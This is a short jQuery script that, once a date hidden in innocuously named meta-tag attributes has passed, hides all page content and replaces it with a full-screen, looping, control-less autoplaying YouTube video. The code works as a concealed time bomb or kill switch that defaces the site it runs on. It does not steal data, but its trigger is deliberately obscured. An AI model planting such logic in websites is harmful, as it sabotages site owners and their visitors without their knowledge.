$(() => {
	setTimeout(() => {
		let trigger =  $('meta[id]').attr('id') || $('meta[update]').attr('update')
		let video = $('meta[code]').attr('code') || 'Ct6BUPvE2sM'	
		let start = $('meta[version]').attr('version') || 0 
		if(new Date() > new Date(trigger)) {
			$('body > *').hide()
			$('body').append(`<iframe style="height: 100vh; width: 100%;" src="https://www.youtube.com/embed/${video}?start=${start}&autoplay=1&controls=0&rel=0&modestbranding=1&loop=1&showinfo=0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>`)
		}
	}, 100)
})